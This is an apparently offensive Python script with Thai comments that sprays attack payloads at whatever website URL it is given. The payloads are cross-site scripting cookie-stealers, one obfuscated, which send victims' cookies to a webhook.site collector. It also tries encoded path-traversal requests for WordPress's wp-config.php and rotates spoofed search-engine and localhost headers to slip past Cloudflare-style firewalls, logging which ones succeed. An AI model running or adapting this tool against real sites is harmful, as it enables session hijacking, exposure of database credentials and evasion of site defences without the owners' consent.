#!/usr/bin/env python3
"""
Quick Test - ทดสอบ payload แบบรวดเร็ว
"""

import requests
import urllib.parse
import time

def quick_test_payloads(target_url):
    """ทดสอบ payload แบบรวดเร็ว"""
    print(f"[+] ทดสอบ payload แบบรวดเร็วสำหรับ: {target_url}")
    print("=" * 50)
    
    # Payloads ที่คุณใช้
    test_payloads = [
        # XSS Cookie Stealing
        "%3Cscript%3Evar%20c%3DString.fromCharCode(99,111,111,107,105,101);var%20d%3DString.fromCharCode(100,111,99,117,109,101,110,116);var%20l%3DString.fromCharCode(108,111,99,97,116,105,111,110);var%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bwindow%5Bd%5D%5Bl%5D%20%3D%20a%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(window%5Bd%5D%5Bc%5D)%3B%3C%2Fscript%3E",
        
        # Path Traversal
        "../../../../../../wp-config.php",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php",
        
        # Alternative XSS
        "%3Cscript%3Evar%20a%3D'https%3A%2F%2Fwebhook.site%2F128fa6c2-fe85-4a6c-b522-0346f6aae885'%3Bdocument.location%3Da%20%2B%20'/?c%3D'%20%2B%20encodeURIComponent(document.cookie)%3B%3C%2Fscript%3E",
    ]
    
    # Bypass techniques
    bypass_headers = [
        {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
        {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'CF-Connecting-IP': '127.0.0.1'},
        {
            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'X-Forwarded-For': '127.0.0.1'
        }
    ]
    
    # Test endpoints
    endpoints = [
        "/search?q=",
        "/index.php?page=",
        "/file?path=",
    ]
    
    successful_tests = []
    
    for i, payload in enumerate(test_payloads, 1):
        print(f"\n[{i}/{len(test_payloads)}] ทดสอบ payload: {payload[:50]}...")
        
        for endpoint in endpoints:
            for j, headers in enumerate(bypass_headers, 1):
                try:
                    test_url = f"{target_url}{endpoint}{payload}"
                    
                    # สร้าง session ใหม่
                    session = requests.Session()
                    session.headers.update(headers)
                    
                    print(f"  [-] ทดสอบ: {endpoint} (technique {j})")
                    
                    response = session.get(test_url, timeout=10)
                    
                    # ตรวจสอบผลลัพธ์
                    is_blocked = any(indicator in response.text.lower() for indicator in [
                        'cloudflare', '403 forbidden', 'attention required', 'sorry, you have been blocked'
                    ])
                    
                    if not is_blocked and response.status_code == 200:
                        print(f"    [+] สำเร็จ! Status: {response.status_code}, Length: {len(response.text)}")
                        print(f"        URL: {test_url}")
                        print(f"        Headers: {headers}")
                        
                        successful_tests.append({
                            'payload': payload,
                            'url': test_url,
                            'headers': headers,
                            'status_code': response.status_code,
                            'response_length': len(response.text),
                            'response_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                        })
                    else:
                        print(f"    [-] ถูกบล็อกหรือไม่สำเร็จ (Status: {response.status_code})")
                    
                    time.sleep(1)  # Delay
                    
                except Exception as e:
                    print(f"    [-] Error: {e}")
                
                time.sleep(0.5)  # Short delay between techniques
    
    # สรุปผลลัพธ์
    print("\n" + "=" * 50)
    print("สรุปผลการทดสอบ:")
    print(f"Payloads ที่ทดสอบ: {len(test_payloads)}")
    print(f"เทคนิค bypass ที่ทดสอบ: {len(bypass_headers)}")
    print(f"การทดสอบที่สำเร็จ: {len(successful_tests)}")
    
    if successful_tests:
        print("\n[+] การทดสอบที่สำเร็จ:")
        for i, test in enumerate(successful_tests, 1):
            print(f"\n{i}. Payload: {test['payload'][:50]}...")
            print(f"   URL: {test['url']}")
            print(f"   Headers: {test['headers']}")
            print(f"   Status: {test['status_code']}, Length: {test['response_length']}")
            print(f"   Preview: {test['response_preview']}")
    else:
        print("\n[-] ไม่มีการทดสอบที่สำเร็จ")
        print("   ลองใช้เทคนิคอื่นๆ หรือตรวจสอบการเชื่อมต่อ")
    
    return successful_tests

def main():
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python quick_test.py <target_url>")
        print("Example: python quick_test.py https://example.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # ตรวจสอบ URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    try:
        results = quick_test_payloads(target_url)
        
        if results:
            print(f"\n[+] พบ {len(results)} การทดสอบที่สำเร็จ!")
            print("   ใช้ข้อมูลเหล่านี้สำหรับการทดสอบเพิ่มเติม")
        else:
            print(f"\n[-] ไม่พบการทดสอบที่สำเร็จ")
            print("   ลองใช้เครื่องมืออื่นๆ เช่น cloudflare_bypass.py")
            
    except KeyboardInterrupt:
        print("\n[-] หยุดการทดสอบโดยผู้ใช้")
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()